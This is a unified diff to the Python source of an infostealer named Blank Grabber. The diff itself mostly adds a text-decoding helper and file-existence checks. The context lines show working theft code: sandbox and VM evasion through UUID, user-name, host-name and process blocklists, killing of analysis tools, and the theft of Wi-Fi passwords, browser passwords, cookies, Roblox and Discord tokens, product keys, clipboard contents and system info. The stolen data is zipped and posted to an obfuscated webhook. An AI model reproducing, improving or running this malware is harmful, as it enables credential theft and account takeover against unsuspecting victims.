@@ -59,6 +59,9 @@ def generate(num=5, invisible= False):
     else:
         return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))
 
+def force_decode(b: bytes):
+    return b.decode(json.detect_encoding(b))
+
 def is_admin():
     s = subprocess.run("net session", shell= True, capture_output= True).returncode
     if s == 0:
@@ -75,10 +78,10 @@ def uac_bypass():
 
 class vmprotect:
     def __init__(self):
-        if int(subprocess.run("wmic computersystem get totalphysicalmemory", capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000 < 1.7:
+        if int(force_decode(subprocess.run("wmic computersystem get totalphysicalmemory", capture_output= True, shell= True).stdout).strip().split()[1])/1000000000 < 1.7:
             fquit()
 
-        if subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", "FE822042-A70C-D08B-F1D1-C207055A488F", "76122042-C286-FA81-F0A8-514CC507B250", "481E2042-A1AF-D390-CE06-A8F783B1E76A"]:
+        if force_decode(subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout).strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", "FE822042-A70C-D08B-F1D1-C207055A488F", "76122042-C286-FA81-F0A8-514CC507B250", "481E2042-A1AF-D390-CE06-A8F783B1E76A"]:
             fquit()
 
         if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson", "user", "j.seance", "a.monaldo", "mike"]:
@@ -87,7 +90,7 @@ class vmprotect:
         if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076"]:
             fquit()
 
-        tasks = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
+        tasks = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout)
         for banned_task in ["fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]:
             if banned_task in tasks.lower():
                 kill = subprocess.run(f"taskkill /IM {banned_task}.exe /F", capture_output= True, shell= True)
@@ -195,7 +198,7 @@ class BlankGrabber:
         os.remove(os.path.join(sys._MEIPASS, "cm.bam"))
 
     def getPKey(self):
-        key = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode().strip()
+        key = force_decode(subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout).strip()
         if len(key.split("-")) == 5:
             self.productKey = key
 
@@ -216,14 +219,14 @@ class BlankGrabber:
     def getWifiPasswords(self):
         profiles = []
         passwords = {}
-        for line in (subprocess.run("netsh wlan show profile", shell= True, capture_output= True).stdout.decode().strip().splitlines()):
+        for line in force_decode(subprocess.run("netsh wlan show profile", shell= True, capture_output= True).stdout).strip().splitlines():
             if "All User Profile" in line:
                 name= line[(line.find(":") + 1):].strip()
                 profiles.append(name)
 
         for profile in profiles:
             found = False
-            for line in (subprocess.run(f"netsh wlan show profile \"{profile}\" key=clear", shell= True, capture_output= True).stdout.decode().strip().splitlines()):
+            for line in force_decode(subprocess.run(f"netsh wlan show profile \"{profile}\" key=clear", shell= True, capture_output= True).stdout).strip().splitlines():
                 if "Key Content" in line:
                     passwords[profile] = line[(line.find(":") + 1):].strip()
                     found = True
@@ -241,7 +244,9 @@ class BlankGrabber:
         subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"pm.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Passwords.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(os.path.join(sys._MEIPASS, "pm.bam"))
-        with open(os.path.join(sys._MEIPASS, "Passwords.txt"), encoding= "utf-16", errors= "ignore") as file:
+        if not os.path.isfile(passfile := os.path.join(sys._MEIPASS, "Passwords.txt")):
+            return
+        with open(passfile, encoding= "utf-16", errors= "ignore") as file:
             passwords = file.read().strip().split("\n\n")
         self.passwords = [x.replace("=" * 50, "Blank Grabber".center(50, "="), 1) for x in passwords]
         if len(self.passwords) > 3:
@@ -253,7 +258,9 @@ class BlankGrabber:
         subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"ck.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Cookies.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(os.path.join(sys._MEIPASS, "ck.bam"))
-        with open(os.path.join(sys._MEIPASS, "Cookies.txt"), encoding= "utf-16", errors= "ignore") as file:
+        if not os.path.isfile(cookiefile := os.path.join(sys._MEIPASS, "Cookies.txt")):
+            return
+        with open(cookiefile, encoding= "utf-16", errors= "ignore") as file:
             cookies = file.read().strip().split("\n\n")
         self.cookies = [x.replace("=" * 50, "Blank Grabber".center(50, "="), 1) for x in cookies]
         if len(self.cookies) > 20:
@@ -284,7 +291,7 @@ class BlankGrabber:
         for i in ("HKCU", "HKLM"):
             rbxcmd = subprocess.run(f"powershell Get-ItemPropertyValue -Path {i}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY", capture_output= True, shell= True)
             if not rbxcmd.returncode:
-                temp.append(rbxcmd.stdout.decode())
+                temp.append(force_decode(rbxcmd.stdout))
         for i in temp:
             for j in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", i):
                 check(j)
@@ -308,7 +315,7 @@ class BlankGrabber:
         PIPE = "│"
         ELBOW = "└──"
         TEE = "├──"
-        tree = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout.decode()
+        tree = force_decode(subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout)
         tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE).splitlines()
         tree = DName + "\n" + "\n".join(tree[3:])
         return tree.strip()
@@ -322,26 +329,26 @@ class BlankGrabber:
             with open(os.path.join(self.tempfolder, "Directories", f"{i}.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write(output[i])
 
-        output = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode().strip()
+        output = force_decode(subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout).strip()
         if len(output) > 0:
             with open(os.path.join(self.system, "Clipboard.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write(output)
 
         output = subprocess.run(r"WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName", capture_output= True, shell= True)
         if not output.returncode:
-            output = output.stdout.decode().strip().splitlines()
+            output = force_decode(output.stdout).strip().splitlines()
             if len(output) >= 2:
                 output = output[2:]
                 with open(os.path.join(self.system, "Antivirus.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                     file.write("\n".join(output))
 
-        output = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
+        output = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout).strip()
         with open(os.path.join(self.system, "Task List.txt"), "w", errors= "ignore") as tasklist:
-            tasklist.write(output.strip())
+            tasklist.write(output)
 
-        output = subprocess.run("systeminfo", capture_output= True, shell= True).stdout.decode()
+        output = force_decode(subprocess.run("systeminfo", capture_output= True, shell= True).stdout).strip()
         with open(os.path.join(self.system, "System Info.txt"), "w", errors= "ignore") as file:
-            file.write(output.strip())
+            file.write(output)
 
     def getTokens(self):
         subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
@@ -374,7 +381,7 @@ class BlankGrabber:
         def RickRollDecrypt(path):
             def decrypt_token(encrypted_token, key):
                 try:
-                    return pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16].decode()
+                    return force_decode(pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16])
 
                 except Exception as e:
                     self.logs(e, sys.exc_info())
@@ -424,7 +431,7 @@ class BlankGrabber:
                 t = threading.Thread(target= lambda: RickRollDecrypt(path[1]))
                 token_threads.append(t)
                 t.start()
-                nextPaths = subprocess.run("dir leveldb /AD /s /b", capture_output= True, shell= True, cwd= path[1]).stdout.decode().strip().splitlines()
+                nextPaths = force_decode(subprocess.run("dir leveldb /AD /s /b", capture_output= True, shell= True, cwd= path[1]).stdout).strip().splitlines()
                 for path in nextPaths:
                     t = threading.Thread(target= lambda: grabcord(path))
                     token_threads.append(t)
@@ -473,13 +480,13 @@ class BlankGrabber:
             r = json.loads(self.http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
             if r.get("status") != "success":
                 raise Exception("Failed")
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + "\nUUID: " + subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str())+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str())+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if len(r["reverse"]) != 0:
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception as e:
             self.logs(e, sys.exc_info())
             r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + "\nUUID: " + subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode().strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str()) + f"\nIP: {r.get('origin')}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str()) + f"\nIP: {r.get('origin')}"
         self.ipinfo = data
 
     def zip(self):
@@ -504,7 +511,7 @@ class BlankGrabber:
   "avatar_url": "https://i.imgur.com/ZZZtlwB.png"
 }
 
-        self.webhook = base64.b85decode(self.webhook.encode()).decode()
+        self.webhook = force_decode(base64.b85decode(self.webhook.encode()))
         self.http.request("POST", self.webhook, body= json.dumps(payload).encode(), headers= self.headers())
         with open(self.archive,"rb") as file:
             self.http.request("POST", self.webhook, fields= {"file": (self.archive, file.read())}, headers= {"user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"})
